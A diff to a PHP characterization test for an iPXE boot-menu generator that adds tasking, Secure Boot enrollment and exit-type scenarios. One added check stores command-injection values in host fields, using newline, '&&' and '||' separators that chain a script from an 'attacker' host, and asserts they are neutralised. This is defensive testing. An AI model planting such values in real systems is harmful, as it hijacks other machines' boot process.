@@ -1,8 +1,8 @@
 <?php
 /**
- * Characterization test for the iPXE script BootMenu emits.
+ * Characterization test for the iPXE script IpxeBootMenu emits.
  *
- * BootMenu has no return value worth checking: every screen is an array of
+ * IpxeBootMenu has no return value worth checking: every screen is an array of
  * strings that _parseMe() flattens straight to stdout, and that stdout IS the
  * iPXE program the client runs. So the only meaningful assertion is a byte
  * comparison of the emitted script.
@@ -18,7 +18,7 @@
  *   - whether a plugin's value survives to the emitted script;
  *   - that no host secret reaches this unauthenticated endpoint.
  *
- * Each scenario runs in its own process: several BootMenu paths end in exit(),
+ * Each scenario runs in its own process: several IpxeBootMenu paths end in exit(),
  * and the architecture profile is memoised in a static that would leak between
  * scenarios sharing a process.
  *
@@ -33,7 +33,7 @@
 $root = dirname(__DIR__);
 $renderer = __DIR__ . '/lib/bootmenu-render.php';
 $golden = __DIR__ . '/fixtures/bootmenu-ipxe-output.golden';
-$classFile = $root . '/packages/web/lib/fog/bootmenu.class.php';
+$classFile = $root . '/packages/web/src/Boot/IpxeBootMenu.php';
 
 $update = in_array('--update', $argv, true);
 $againstAt = array_search('--against', $argv, true);
@@ -47,7 +47,7 @@ if (!is_file($classFile)) {
 }
 
 /*
- * The matrix. Each entry names a branch of BootMenu that renders differently,
+ * The matrix. Each entry names a branch of IpxeBootMenu that renders differently,
  * so a change that moves any of these bytes shows up as a diff rather than as
  * a client that silently fails to boot.
  *
@@ -57,10 +57,10 @@ if (!is_file($classFile)) {
  *    availability and the override guard all switch on it;
  *  - hidden vs shown menu, the only path through _chainBoot();
  *  - registered / pending / unregistered, which select the pxeRegOnly set;
- *  - both Secure Boot states, which _enrollSecureBootChoice() reads
- *    (MOK.der present or absent);
- *  - both arch-mismatch notices, and the _echoSafe() whitelist;
- *  - the keymap special cases (Norwegian and Serbian get their own mapping).
+ *  - all four Secure Boot file states, which _filterMenus() and
+ *    _enrollSecureBootChoice() read separately (MOK.der gates the attended
+ *    item's body, PK/KEK/db.auth gate whether the unattended item is listed);
+ *  - both arch-mismatch notices, and the _echoSafe() whitelist.
  */
 $scenarios = [
     'unregistered-bios-x86' => [
@@ -72,6 +72,15 @@ $scenarios = [
     'unregistered-efi-x86-mok' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'efi'],
         'mok' => true,
+    ],
+    'unregistered-efi-x86-mok-authvars' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi'],
+        'mok' => true,
+        'authvars' => true,
+    ],
+    'unregistered-efi-x86-authvars-only' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi'],
+        'authvars' => true,
     ],
     'unregistered-efi-i386' => [
         'request' => ['arch' => 'i386', 'platform' => 'efi'],
@@ -86,10 +95,247 @@ $scenarios = [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
         'host' => ['id' => 1, 'name' => 'testhost'],
     ],
-    'registered-efi-mok' => [
+
+    /*
+     * Tasking. Everything above renders the MENU -- every one of those
+     * scenarios carries an invalid task so getTasking() falls straight
+     * through to printDefault(), which left the ~360 lines that build a
+     * task's kernel arguments with no characterization at all. These cover
+     * the branches that decide what FOS is told to do, because a wrong
+     * argument here is a client that boots and then images the wrong thing.
+     */
+    'task-deploy' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => [
+                'id' => 1,
+                'typeID' => 1,
+                'tasktype' => [
+                    'id' => 1,
+                    'imaging' => true,
+                    'initneeded' => true,
+                    'kernelArgs' => 'type=down',
+                ],
+                'image' => [
+                    'id' => 1,
+                    'osID' => 50,
+                    'path' => 'testimage',
+                    'format' => 5,
+                    'imagetype' => 'mps',
+                    'partitiontype' => 'all',
+                ],
+            ],
+        ],
+    ],
+    /*
+     * A shutdown asked for by extraargs ALONE -- the task type's own
+     * kernelArgs deliberately do not mention it, so the render can only
+     * emit shutdown=1 by reading _extraArgs() and passing it through
+     * _wantsShutdown(). Both halves are then gated: an extraargs of
+     * 'shutdown=1 mode=debug' is exactly the shape that stripos()'s
+     * reversed arguments used to miss, and only a bare 'shutdown=1' ever
+     * worked, by accident. Nothing else in this file renders that
+     * argument, so without this scenario the pair is unexercised.
+     */
+    'task-deploy-shutdown' => [
+        'request' => [
+            'arch' => 'x86_64',
+            'platform' => 'bios',
+            'extraargs' => 'shutdown=1 mode=debug',
+        ],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => [
+                'id' => 1,
+                'typeID' => 1,
+                'tasktype' => [
+                    'id' => 1,
+                    'imaging' => true,
+                    'initneeded' => true,
+                    'kernelArgs' => 'type=down',
+                ],
+                'image' => [
+                    'id' => 1,
+                    'osID' => 50,
+                    'path' => 'testimage',
+                    'format' => 5,
+                    'imagetype' => 'mps',
+                    'partitiontype' => 'all',
+                ],
+            ],
+        ],
+    ],
+    'task-capture' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => [
+                'id' => 1,
+                'typeID' => 2,
+                'capture' => true,
+                'tasktype' => [
+                    'id' => 2,
+                    'imaging' => true,
+                    'initneeded' => true,
+                    'capture' => true,
+                    'kernelArgs' => 'type=up',
+                ],
+                'image' => [
+                    'id' => 1,
+                    'osID' => 50,
+                    'path' => 'testimage',
+                    'format' => 5,
+                    'imagetype' => 'mps',
+                    'partitiontype' => 'all',
+                ],
+            ],
+        ],
+    ],
+    'task-deploy-arm64' => [
+        'request' => ['arch' => 'arm64', 'platform' => 'efi'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => [
+                'id' => 1,
+                'typeID' => 1,
+                'tasktype' => [
+                    'id' => 1,
+                    'imaging' => true,
+                    'initneeded' => true,
+                    'kernelArgs' => 'type=down',
+                ],
+                'image' => [
+                    'id' => 1,
+                    'osID' => 50,
+                    'path' => 'testimage',
+                    'format' => 5,
+                    'imagetype' => 'mps',
+                    'partitiontype' => 'all',
+                ],
+            ],
+        ],
+    ],
+    'task-deploy-debug' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => [
+                'id' => 1,
+                'typeID' => 1,
+                'tasktype' => [
+                    'id' => 1,
+                    'imaging' => true,
+                    'initneeded' => true,
+                    'kernelArgs' => 'type=down mode=debug',
+                ],
+                'image' => [
+                    'id' => 1,
+                    'osID' => 50,
+                    'path' => 'testimage',
+                    'format' => 5,
+                    'imagetype' => 'mps',
+                    'partitiontype' => 'all',
+                ],
+            ],
+        ],
+    ],
+    'task-non-imaging' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => [
+                'id' => 1,
+                'typeID' => 12,
+                'tasktype' => [
+                    'id' => 12,
+                    'imaging' => false,
+                    'initneeded' => true,
+                    'kernelArgs' => 'mode=wipe',
+                ],
+                'image' => ['id' => 1, 'osID' => 50, 'path' => 'testimage'],
+            ],
+        ],
+    ],
+    /*
+     * The false-tasking pair (GH-1767). falseTasking() is what the "Deploy
+     * Image" menu item reaches when the machine in front of it has no host
+     * row, and it is the only tasking render whose mac= does NOT come from
+     * a host. It comes from FOGBase::$requestMacs, which getHostItem() fills
+     * from the mac0/macboot/mac1..mac7 fields the menu posts -- there is no
+     * 'mac' field in that request, which is exactly why reading one produced
+     * an empty argument and left FOS unable to identify itself afterward.
+     */
+    'falsetasking-unregistered' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'requestMacs' => ['aa:bb:cc:dd:ee:ff'],
+        'falseTasking' => [
+            'id' => 1,
+            'osID' => 50,
+            'path' => 'testimage',
+            'format' => 5,
+            'imagetype' => 'mps',
+            'partitiontype' => 'all',
+        ],
+    ],
+    'falsetasking-registered-pending' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'requestMacs' => ['aa:bb:cc:dd:ee:ff'],
+        'host' => ['id' => 1, 'name' => 'testhost'],
+        'falseTasking' => [
+            'id' => 1,
+            'osID' => 50,
+            'path' => 'testimage',
+            'format' => 5,
+            'imagetype' => 'mps',
+            'partitiontype' => 'all',
+        ],
+    ],
+    'task-snapin-falls-to-menu' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'task' => ['id' => 1, 'typeID' => 13, 'snapin' => true],
+        ],
+    ],
+    'task-image-ignored' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+        'host' => [
+            'id' => 1,
+            'name' => 'testhost',
+            'imageignored' => true,
+            'task' => [
+                'id' => 1,
+                'typeID' => 1,
+                'tasktype' => [
+                    'id' => 1,
+                    'imaging' => true,
+                    'initneeded' => true,
+                    'kernelArgs' => 'type=down',
+                ],
+                'image' => [
+                    'id' => 1,
+                    'osID' => 50,
+                    'path' => 'testimage',
+                    'format' => 5,
+                    'imagetype' => 'mps',
+                    'partitiontype' => 'all',
+                ],
+            ],
+        ],
+    ],
+    'registered-efi-mok-authvars' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'efi'],
         'host' => ['id' => 1, 'name' => 'testhost'],
         'mok' => true,
+        'authvars' => true,
     ],
     'pending-approval' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
@@ -161,9 +407,14 @@ $scenarios = [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
         'settings' => ['FOG_BOOT_EXIT_TYPE' => 'sanboot'],
     ],
-    'exit-reboot' => [
-        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
-        'settings' => ['FOG_BOOT_EXIT_TYPE' => 'reboot'],
+    // The sanboot string is NOT the same on both platforms: `--drive 0` means
+    // "first disk carrying \EFI\Boot\bootx64.efi" on UEFI and "int13 drive
+    // 0x00, the first floppy" on BIOS, so the EFI probe is emitted only for
+    // EFI. Pin both, or a future edit collapses them back to one string and
+    // legacy clients go back to failing an int13 floppy read on every exit.
+    'exit-sanboot-efi' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi'],
+        'settings' => ['FOG_EFI_BOOT_EXIT_TYPE' => 'sanboot'],
     ],
     'exit-exit' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
@@ -203,7 +454,7 @@ $scenarios = [
     ],
     'host-exit-override' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
-        'host' => ['id' => 1, 'name' => 'testhost', 'biosexit' => 'reboot'],
+        'host' => ['id' => 1, 'name' => 'testhost', 'biosexit' => 'exit'],
     ],
     'no-menu' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
@@ -213,14 +464,6 @@ $scenarios = [
     'keymap-set' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
         'settings' => ['FOG_KEYMAP' => 'uk'],
-    ],
-    'keymap-norwegian' => [
-        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
-        'settings' => ['FOG_KEYMAP' => 'no-latin1'],
-    ],
-    'keymap-serbian' => [
-        'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
-        'settings' => ['FOG_KEYMAP' => 'sr'],
     ],
     'kernel-args-and-debug' => [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
@@ -236,6 +479,64 @@ $scenarios = [
         'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
         'settings' => ['FOG_WEB_ROOT' => 'fog'],
     ],
+
+    /*
+     * The `sbenroll` request the Enroll Secure Boot Key choice chains back
+     * with (#1869). Each answers with the MokManager script; the
+     * #harness-writes line says whether the host record was written.
+     * The stub MOK.der holds the bytes 'test', so the server fingerprint is
+     * the SHA-256 of 'test'.
+     */
+    'sbenroll-registered-no-record' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi', 'sbenroll' => '1'],
+        'host' => ['id' => 1, 'name' => 'testhost'],
+        'mok' => true,
+    ],
+    // A confirmed record of today's certificate: no write.
+    'sbenroll-registered-confirmed-current' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi', 'sbenroll' => '1'],
+        'host' => [
+            'id' => 1, 'name' => 'testhost',
+            'sbenrollvia' => 'mok',
+            'sbenrollcert' => '9F:86:D0:81:88:4C:7D:65:9A:2F:EA:A0:C5:5A:D0:15:A3:BF:4F:1B:2B:0B:82:2C:D1:5D:6C:15:B0:F0:0A:08',
+        ],
+        'mok' => true,
+    ],
+    // An earlier unconfirmed attempt: restamped.
+    'sbenroll-registered-pending-current' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi', 'sbenroll' => '1'],
+        'host' => [
+            'id' => 1, 'name' => 'testhost',
+            'sbenrollvia' => 'mok-pending',
+            'sbenrollcert' => '9F:86:D0:81:88:4C:7D:65:9A:2F:EA:A0:C5:5A:D0:15:A3:BF:4F:1B:2B:0B:82:2C:D1:5D:6C:15:B0:F0:0A:08',
+        ],
+        'mok' => true,
+    ],
+    // A confirmed record of a superseded certificate: re-enrollment, written.
+    'sbenroll-registered-confirmed-stale' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi', 'sbenroll' => '1'],
+        'host' => [
+            'id' => 1, 'name' => 'testhost',
+            'sbenrollvia' => 'db',
+            'sbenrollcert' => 'AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA:AA',
+        ],
+        'mok' => true,
+    ],
+    // No host record to write; the script is the same.
+    'sbenroll-unregistered' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi', 'sbenroll' => '1'],
+        'mok' => true,
+    ],
+    // Refused, and nothing written, when there is no key or no shim.
+    'sbenroll-no-mok' => [
+        'request' => ['arch' => 'x86_64', 'platform' => 'efi', 'sbenroll' => '1'],
+        'host' => ['id' => 1, 'name' => 'testhost'],
+    ],
+    'sbenroll-efi-i386' => [
+        'request' => ['arch' => 'i386', 'platform' => 'efi', 'sbenroll' => '1'],
+        'host' => ['id' => 1, 'name' => 'testhost'],
+        'mok' => true,
+    ],
 ];
 
 /**
@@ -243,7 +544,7 @@ $scenarios = [
  *
  * @param string $renderer  path to the renderer
  * @param array  $scenario  the scenario definition
- * @param string $classFile the BootMenu source under test
+ * @param string $classFile the IpxeBootMenu source under test
  *
  * @return string the emitted iPXE script, plus any stderr
  */
@@ -321,17 +622,12 @@ if ($broken) {
 }
 
 /*
- * Behaviour checks the golden cannot express.
+ * Behavior checks the golden cannot express.
  *
  * Each renders a scenario and asserts on something other than the exact bytes:
- * what a plugin was handed, and whether a plugin's value survived.
- * 'expectHook' reads the BOOT_ITEM_NEW_SETTINGS payload; 'expectLine' /
- * 'refuteLine' match against the emitted script.
- *
- * (working-1.6 also checks that no host secret reaches this unauthenticated
- * endpoint. That guard belongs with generateIpxeItems(), which emits host
- * columns as `set` lines and does not exist on this branch -- there is no
- * host data in the emitted script here to leak.)
+ * what a plugin was handed, whether a plugin's value survived, or whether a
+ * secret escaped. 'expectHook' reads the BOOT_ITEM_NEW_SETTINGS payload;
+ * 'expectLine' / 'refuteLine' match against the emitted script.
  */
 $checks = [
     'webroot reaches plugins as the bare form' => [
@@ -385,6 +681,156 @@ $checks = [
         ],
         'expectLine' => ['imgfetch plugin-init.xz'],
     ],
+    'no host secret reaches this unauthenticated endpoint' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'hostRow' => [
+                'token' => 'TOKENSHOULDNOTAPPEAR',
+                'pub_key' => 'PUBKEYSHOULDNOTAPPEAR',
+                'sec_tok' => 'SECTOKSHOULDNOTAPPEAR',
+                'productKey' => 'PRODKEYSHOULDNOTAPPEAR',
+                'ADPass' => 'ADPASSSHOULDNOTAPPEAR',
+                'ADPassLegacy' => 'ADPASSLEGACYSHOULDNOTAPPEAR',
+            ],
+        ],
+        'expectLine' => ['set hostname testhost'],
+        'refuteLine' => [
+            'TOKENSHOULDNOTAPPEAR',
+            'PUBKEYSHOULDNOTAPPEAR',
+            'SECTOKSHOULDNOTAPPEAR',
+            'PRODKEYSHOULDNOTAPPEAR',
+            'ADPASSSHOULDNOTAPPEAR',
+            'ADPASSLEGACYSHOULDNOTAPPEAR',
+        ],
+    ],
+    /*
+     * generateIpxeItems() emits host and inventory columns as `set` lines,
+     * and service/inventory.php authenticates by MAC alone -- so anyone who
+     * knows a MAC can write those columns. iPXE separates commands on a
+     * newline and on `&&`/`||`, so an unsanitized value is an
+     * unauthenticated command injection into the boot script of someone
+     * else's machine, emitted above the menu where it runs before the user
+     * sees anything.
+     *
+     * Each refute is the SEPARATOR plus the command, not the command alone:
+     * once the separator is stripped the payload text survives harmlessly
+     * inside the value, so a marker-only refute would report a pass on
+     * output that still contained it. The matching expectLine pins that the
+     * field is still emitted, so dropping the value outright does not pass
+     * either.
+     */
+    'no host field can inject an iPXE command' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'hostRow' => [
+                'imagename' => "keepme\nchain http://attacker/newline.ipxe",
+                'description2' => 'keepme && chain http://attacker/andand.ipxe',
+                'description3' => 'keepme || chain http://attacker/oror.ipxe',
+                'description4' => 'keepme ${boot-url}',
+            ],
+        ],
+        'expectLine' => [
+            'set imagename keepme',
+            'set description2 keepme',
+            'set description3 keepme',
+            'set description4 keepme',
+        ],
+        'refuteLine' => [
+            "\nchain http://attacker/newline.ipxe",
+            '&& chain http://attacker/andand.ipxe',
+            '|| chain http://attacker/oror.ipxe',
+            'set description4 keepme ${boot-url}',
+        ],
+    ],
+    /*
+     * A flag set to off has to reach iPXE as `set <field> 0`, not as
+     * nothing. iPXE conditionals are isset/iseq, so an omitted field and a
+     * field that is false read identically -- which is what stopped GH-572's
+     * "show this menu item only when the flag is set" case from working at
+     * all. Covered here rather than in the golden because the golden's host
+     * row carries no zero-valued column.
+     *
+     * The empty/null pair is asserted alongside deliberately: widening the
+     * falsy guard is only correct if it stops at absent, and a guard that
+     * emitted `set nothingset ` for an empty column would still satisfy the
+     * zero half on its own.
+     */
+    'a false flag is emitted as 0, an absent one not at all' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'hostRow' => [
+                'enforce' => 0,
+                'pending' => '0',
+                'useAD' => false,
+                'nothingset' => '',
+                'nevermind' => null,
+            ],
+        ],
+        'expectLine' => [
+            "\nset enforce 0\n",
+            "\nset pending 0\n",
+            "\nset useAD 0\n",
+        ],
+        'refuteLine' => [
+            'set nothingset',
+            'set nevermind',
+        ],
+    ],
+    /*
+     * The constructor's only _parseMe() used to sit inside
+     * `if ($StorageNode->isValid())`, so an install with no enabled storage
+     * node emitted no header at all -- no '#!ipxe', which iPXE rejects
+     * outright, so the machine does not boot rather than booting to a menu
+     * with imaging missing. Asserted on the shebang and on a host variable,
+     * because those are what the guard was swallowing; storage-ip is
+     * genuinely conditional and is refuted here to pin that the fix moved
+     * the flush out rather than moving the condition off.
+     */
+    'the header is emitted even with no storage node' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'noStorageNode' => true,
+        ],
+        'expectLine' => [
+            '#!ipxe',
+            'set hostname testhost',
+            'set boot-url ',
+        ],
+        'refuteLine' => ['set storage-ip'],
+    ],
+    /*
+     * The host and the inventory are separate records read by the same
+     * emitter, and they share column names: Route's inventory list joins the
+     * host name in as `hostname` for the Inventory grid, and the host record
+     * supplies the same variable from its own `name`. Both were emitted.
+     *
+     * An iPXE `set` is last-wins, so this was not merely a duplicate line --
+     * the value the menu ended up using came from whichever record happened
+     * to be read second. The inventory's `hostname` is given a DIFFERENT
+     * value here on purpose: asserting only that the line appears once would
+     * pass with the wrong record winning, which is the half that actually
+     * matters.
+     */
+    'the host wins a variable the inventory also supplies' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'inventoryRow' => [
+                'hostname' => 'staleinventoryname',
+                'sysman' => 'ACME',
+            ],
+        ],
+        'expectLine' => [
+            "\nset hostname testhost\n",
+            "\nset sysman ACME\n",
+        ],
+        'expectCount' => ['set hostname ' => 1],
+        'refuteLine' => ['staleinventoryname'],
+    ],
 ];
 
 $checkFailures = [];
@@ -430,16 +876,33 @@ foreach ($checks as $label => $check) {
             $checkFailures[] = "$label: '$needle' must NOT appear";
         }
     }
+    /*
+     * For a variable two records can both supply. expectLine only proves the
+     * right value is present somewhere; iPXE `set` is last-wins, so the
+     * count is what proves the loser was not emitted after the winner.
+     */
+    foreach ((array)($check['expectCount'] ?? []) as $needle => $want) {
+        $have = substr_count($raw, $needle);
+        if ($have !== $want) {
+            $checkFailures[] = sprintf(
+                "%s: '%s' appears %d time(s), expected %d",
+                $label,
+                $needle,
+                $have,
+                $want
+            );
+        }
+    }
 }
 if ($checkFailures) {
-    fwrite(STDERR, "\nFAIL: behaviour checks\n");
+    fwrite(STDERR, "\nFAIL: behavior checks\n");
     foreach ($checkFailures as $f) {
         fwrite(STDERR, "  $f\n");
     }
     exit(1);
 }
 printf(
-    "bootmenu-ipxe-output: %d behaviour checks passed\n",
+    "bootmenu-ipxe-output: %d behavior checks passed\n",
     count($checks)
 );
 
